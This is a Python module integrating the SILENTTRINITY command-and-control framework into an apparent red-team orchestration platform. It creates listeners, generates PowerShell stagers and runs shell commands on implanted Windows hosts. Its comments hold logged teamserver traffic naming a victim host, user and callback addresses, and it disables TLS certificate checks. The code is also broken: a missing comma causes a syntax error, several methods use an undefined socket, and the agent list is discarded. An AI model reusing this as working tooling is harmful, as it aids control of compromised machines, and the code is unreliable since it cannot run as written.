from .. import ResourceExistsError, ResourceNotFoundError
from .. import C2, ListenerType, LauncherType, AgentType, Options, OptionDesc
from ....dtos import AgentDto, CreateListenerDto, RequestDto, ResponseDto, ShellExecuteDto, DownloadFileDto, UploadFileDto
from ....dtos import CreateLauncherDto

import asyncio
import random
import string
from typing import Optional, Dict
import logging
import json

logger = logging.getLogger(__name__)

import hmac
from hashlib import sha512
from base64 import b64encode
# from websockets import Headers
# coding: utf-8
from asgiref.sync import async_to_sync
from asgiref.sync import sync_to_async

import  base64
from base64 import b64encode
import websockets
from websockets import Headers
import hmac
from hashlib import sha512
import ssl
from urllib.parse import urlparse
import logging

logger = logging.getLogger(__name__)


def gen_random_string(length: int = 10):
    return ''.join([random.choice(string.ascii_letters + string.digits) for n in range(length)])

async def recv_(ws):
    response = await ws.recv()
    logging.info("Response: %r", repr(response))

class SilentTriC2(C2):
    name = 'Silent Trinity'
    description = 'Base integration of st_client'
    documentation = 'https://github.com/byt3bl33d3r/SILENTTRINITY'
    registered_options = [
        OptionDesc(
            name='teamserver_url',
            description='Url of the corresponding API',
            example='wss://127.0.0.1:8000',
            field_type='string',
            required=True
        ),
        OptionDesc(
            name='username',
            description='user owner of the API',
            example='silenttri',
            field_type='string',
            required=True
        ),
        OptionDesc(
            name='password',
            description='Url of the corresponding teamserver',
            example='p4ssw0rd',
            field_type='protected-string',
            required=True
        ),
    ]

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._token: Optional[str] = None
        # self._listener_types = {
        #     SilentTriHTTPListenerType.name: SilentTriHTTPListenerType(
        #         self.options['url'],
        #         self
        #     ),
        # }
        # self._launcher_types = {
        #     SilentTriPowershellLauncherType.name: SilentTriPowershellLauncherType(self.options['url'], self),
        # }

        # self._agent_types = {
        #     'powershell': PowershellAgentType(self.options['url'], self),
        # }

    def generate_auth_header(self, username, password):
        client_digest = hmac.new(password.encode(), msg=b'silenttrinity', digestmod=sha512).hexdigest()
        header_value = b64encode(f"{username}:{client_digest}".encode()).decode()
        return Headers({'Authorization': header_value})

    async def is_alive(self, requestDto: RequestDto) -> ResponseDto:
        """
            tries to connect to the corresponding c2 and returns ResponseDto with successful_transaction in case fo success
            raises ConectionError in case of not be able to connect to c2 instance
            raises ConnectionRefusedError in case of not be able to authenticate
        """
        username = requestDto.c2.options.get('username')
        password = requestDto.c2.options.get('password')
        teamserver_url = requestDto.c2.options.get('teamserver_url')

        # head = await sync_to_async(self.generate_auth_header)(username, password)
        head = self.generate_auth_header(username, password)
        logger.debug("head : %r", head)

        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        URL = urlparse(teamserver_url)
        url = f"{URL.scheme}://{URL.hostname}:{URL.port}"

        async with websockets.connect(
            url, 
            extra_headers=head, 
            ssl=ssl_context, 
            ping_interval=None, # We disable the built-in ping/heartbeat mechanism and use our own
            ping_timeout=None
        ) as ws:

            logger.error(f'Connected to {url}')
            self.ws = ws
            return ResponseDto(successful_transaction=True)

    async def retrieve_agents(self, dto: RequestDto) -> ResponseDto:
        """
            retrives all available Agents on the  given C2
               raises ValueError in case of invalid dto
               raises ConectionError in case of not be able to connect to c2 instance
        """
        # ---> {"id": "eqWKq4m74d", "ctx": "sessions", "cmd": "get_selected", "args": {}, "data": {}}
        # <--- {"type": "message", "id": "eqWKq4m74d", "ctx": "sessions", "name": "get_selected", "status": "error", "result": "Command 'get_selected' does not exist in context 'sessions'"}

        # ---> {"id": "i8Qz3wVLUt", "ctx": "sessions", "cmd": "list", "args": {}, "data": {}}
        # <--- {"type": "message", "id": "i8Qz3wVLUt", "ctx": "sessions", "name": "list", "status": "success", "result": {"b0c71f5e-660b-4f93-b722-9df523b4b063": {"guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "alias": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117", "info": {"OsReleaseId": "2009", "Jobs": 1, "Sleep": 5000, "Guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "ProcessId": 7236, "Os": "Microsoft Windows 10 Home 10.0.19043.0", "DotNetVersion": "4.0.30319.42000", "Hostname": "DESKTOP-2LD29PJ", "MinJitter": 0, "HighIntegrity": false, "Debug": true, "MaxJitter": 0, "ProcessName": "powershell", "NetworkAddresses": ["192.168.0.117", "169.254.51.246"], "Domain": "DESKTOP-2LD29PJ", "OsArch": "x64", "Username": "criso", "C2Channels": ["https"], "CallBackUrls": [["https://192.168.0.173:8899"]]}, "lastcheckin": 2.287958860397339}}}
        set_ctx = {"id": "eqWKq4m74d", "ctx": "sessions", "cmd": "get_selected", "args": {}, "data": {}}
        await ws.send(json.dumps(set_ctx))
        await recv_(ws)
        cmd_list = {"id": "i8Qz3wVLUt", "ctx": "sessions", "cmd": "list", "args": {}, "data": {}} 
        await ws.send(json.dumps(cmd_list))
        response = await recv_(ws)
        agents = response['results']
        agents = []
        for agent_id in agents:
            _agent = AgentDto(
                internal_id=agent_id,
                hostname=agents['agent']['info']['Hostname'],
                active=True,
                listener_internal_id=1,
                agent_shell_type='powershell',
                username='criso'
            )
            agents.append(_agent)
        dto = ResponseDto(
            agents=agents,
            successful_transaction=True,
        )
        return dto



class SilentTriHTTPListenerType(ListenerType):
    name = 'https-profile'
    description = 'standard http listener, messages are delivered in enconded comment'
    registered_options = [
        OptionDesc(
            name='bindPort',
            description='port to which the agent is going to try to connect',
            example=80,
            field_type='integer',
            required=True
        ),
        OptionDesc(
            name='bindIp'
            description='interfaces to which the listener is bind',
            example='0.0.0.0',
            field_type='string',
            required=False
        ),
    ]

    def __init__(self, url: str, _c2: SilentTriC2) -> None:
        self._url = url
        self._c2 = _c2

    async def create_listener(self, options: Options, dto: RequestDto) -> Dict:
        _bindPort = options.get('bindPort', 8080)
        _bindIp = options.get('bindIp','0.0.0.0')
        ws = self._c2.ws
        await recv_(ws)
        await recv_(ws)
        set_listeners = {"id": "SeI6WD3JP5", "ctx": "listeners", "cmd": "get_selected", "args": {}, "data": {}}
        await ws.send(json.dumps(set_listeners))
        await recv_(ws)

        set_https = {"id": "uxQO9VK04w", "ctx": "listeners", "cmd": "use", "args": {"name": "https"}, "data": {}}
        await ws.send(json.dumps(set_https))
        await recv_(ws)

        set_port = {"id": "RX9o7Z6qQN", "ctx": "listeners", "cmd": "set", "args": {"name": "Port", "value": str(_bindPort)}, "data": {}}
        await ws.send(json.dumps(set_port))
        await recv_(ws)

        set_iface = {"id": "OsxgyZcfSX", "ctx": "listeners", "cmd": "set", "args": {"name": "BindIP", "value": _bindIp}, "data": {}}
        await ws.send(json.dumps(set_iface))
        await recv_(ws)

        set_start = {"id": "5atzrUrEXj", "ctx": "listeners", "cmd": "start", "args": {}, "data": {}}
        await ws.send(json.dumps(set_start))
        await recv_(ws)
        return ResponseDto(successful_transaction=True)

    async def delete_listener(
        self,
        internal_id: str,
        options: Options,
        dto: RequestDto
    ) -> None:
        raise NotImplementedError


class SilentTriPowershellLauncherType(LauncherType):
    name = 'Powershell Launcher'
    description = 'Uses powershell.exe to launch Agent using [systemm.reflection.assemly::load()'
    registered_options = [
        OptionDesc(
            name='Delay',
            description='Amount of time that Agent will take the agent to contact the listener in seconds',
            example='5',
            field_type='integer',
            required=True
        ),
    ]

    def __init__(self, url: str,  _c2: SilentTriC2) -> None:
        self._url = url
        self._c2 = _c2
    
    async def create_and_retrieve_launcher(self, options: Options, dto: RequestDto):
        """
        creates and retrieves laucnher on the corresponding C2 
           raises ValueError in case of invalid dto
           raises ConectionError in case of not be able to connect to c2 instance
        """
        # ---> {"id": "xOUvWeyOk3", "ctx": "stagers", "cmd": "get_selected", "args": {}, "data": {}}
        # <--- {"type": "message", "id": "xOUvWeyOk3", "ctx": "stagers", "name": "get_selected", "status": "success", "result": {"name": "wmic", "description": "Stage via wmic XSL execution", "author": "@byt3bl33d3r", "options": {}}}

        # ---> {"id": "d3rTRvnuhT", "ctx": "listeners", "cmd": "set", "args": {"name": "Name", "value": "test"}, "data": {}}

        # ---> {"id": "GSdJMyul3K", "ctx": "stagers", "cmd": "use", "args": {"name": "powershell_stageless"}, "data": {}}
        # <--- {"type": "message", "id": "GSdJMyul3K", "ctx": "stagers", "name": "use", "status": "success", "result": {"name": "powershell_stageless", "description": "Embeds the BooLang Compiler within PowerShell and directly executes STs stager", "author": "@byt3bl33d3r", "options": {"AsFunction": {"Description": "Generate stager as a PowerShell function", "Required": false, "Value": true}}}}

        # ---> {"id": "4hM4EksY4b", "ctx": "stagers", "cmd": "generate", "args": {"listener_name": "https"}, "data": {}}                                                                                             
        # <--- {"type": "message", "id": "4hM4EksY4b", "ctx": "stagers", "name": "generate", "status": "success", "result": {"output": "function Invoke-L..... ", "suggestions": "", "extension": "ps1"}}

        set_ctx = {"id": "xOUvWeyOk3", "ctx": "stagers", "cmd": "get_selected", "args": {}, "data": {}}
        await ws.send(json.dumps(set_ctx))
        await recv_(ws)

        set_powershell_stagless = {"id": "GSdJMyul3K", "ctx": "stagers", "cmd": "use", "args": {"name": "powershell_stageless"}, "data": {}}
        await ws.send(json.dumps(set_powershell_stagless))
        await recv_(ws)

        set_generate = {"id": "4hM4EksY4b", "ctx": "stagers", "cmd": "generate", "args": {"listener_name": "https"}, "data": {}}                                                                                             
        await ws.send(json.dumps(set_generate))
        await recv_(ws)

class PowershellAgentType(AgentType):
    agent_shell_type = 'powershell'

    def __init__(self, url: str, _c2: SilentTriC2) -> None:
        self._url = url
        self._c2 = _c2

    async def shell_execute(self, command: str, shell_dto: ShellExecuteDto, dto: RequestDto) -> bytes:
        """
        executes a command string on the target's machine
           raises ValueError in case of invalid dto
           raises ConectionError in case of not be able to connect to c2 instance
           raises ResourceNotFoundError
        """
        # ---> {"id": "Qv9BdutEJ0", "ctx": "modules", "cmd": "use", "args": {"name": "boo/shell"}, "data": {}}
        # <--- {"type": "message", "id": "Qv9BdutEJ0", "ctx": "modules", "name": "use", "status": "success", "result": {"name": "boo/shell", "language": "boo", "description": "Runs a shell command", "author": "@byt3bl33d3r", "references": [], "options": {"Command": {"Description": "The ShellCommand to execute, including any arguments", "Required": true, "Value": ""}, "Path": {"Description": "The Path of the directory from which to execute the ShellCommand", "Required": false, "Value": "C:\\WINDOWS\\System32"}, "Username": {"Description": "Optional alternative username to execute ShellCommand as", "Required": false, "Value": ""}, "Domain": {"Description": "Optional alternative Domain of the username to execute ShellCommand as", "Required": false, "Value": ""}, "Password": {"Description": "Optional password to authenticate the username to execute the ShellCommand as", "Required": false, "Value": ""}}}}

        # ---> {"id": "kTZN3U1Xtz", "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": "whoami"}, "data": {}}
        # <--- {"type": "message", "id": "kTZN3U1Xtz", "ctx": "modules", "name": "set", "status": "success", "result": null}   

        # ---> {"id": "tfwCJrSKZf", "ctx": "modules", "cmd": "run", "args": {"guids": ["b0c71f5e-660b-4f93-b722-9df523b4b063"]}, "data": {}}
        # <--- {"type": "message", "id": "tfwCJrSKZf", "ctx": "modules", "name": "run", "status": "success", "result": null}
        # <--- {"type": "event", "name": "JOB_RESULT", "data": {"id": "Aw8lrj6luD", "output": "[*] Path: C:\\WINDOWS\\System32 Command: whoami Args: \r\ndesktop-2ld29pj\\criso\r\n\r\n", "session": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117"}}
        # [*] [TS-UM5UF] b0c71f5e-660b-4f93-b722-9df523b4b063 returned job result (id: Aw8lrj6luD)
        # [*] Path: C:\WINDOWS\System32 Command: whoami Args: 
        # desktop-2ld29pj\criso
        set_ctx = {"id": "Qv9BdutEJ0", "ctx": "modules", "cmd": "use", "args": {"name": "boo/shell"}, "data": {}}
        await ws.send(json.dumps(set_ctx))
        await recv_(ws)

        set_ctx = {"id": "kTZN3U1Xtz", "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": "whoami"}, "data": {}}
        await ws.send(json.dumps(set_ctx))
        await recv_(ws)

        set_ctx = {"id": "tfwCJrSKZf", "ctx": "modules", "cmd": "run", "args": {"guids": ["b0c71f5e-660b-4f93-b722-9df523b4b063"]}, "data": {}}
        await ws.send(json.dumps(set_ctx))
        await recv_(ws)

    async def download_file(self, download_dto: DownloadFileDto, dto: RequestDto) -> bytes:
        """
        downloads the required file from the target's machine
           raises ValueError in case of invalid dto
           raises ConectionError in case of not be able to connect to c2 instance
           raises ResourceNotFoundError 

        """
        raise NotImplementedError

    async def upload_file(self, upload_dto: UploadFileDto, dto: RequestDto) -> bytes:
        """
        uploads the provided file to the target's machine
           raises ValueError in case of invalid dto
           raises ConectionError in case of not be able to connect to c2 instance
           raises ResourceNotFoundError 

        """
        raise NotImplementedError
